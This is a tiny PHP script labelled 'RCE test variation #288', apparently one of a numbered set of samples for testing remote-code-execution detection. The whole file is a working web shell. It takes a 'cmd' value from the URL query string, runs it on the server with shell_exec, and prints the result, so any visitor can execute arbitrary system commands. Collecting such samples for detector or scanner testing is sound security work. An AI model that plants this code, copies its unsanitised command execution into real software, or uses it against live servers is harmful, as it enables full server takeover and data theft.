<?php
// RCE test variation #288
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>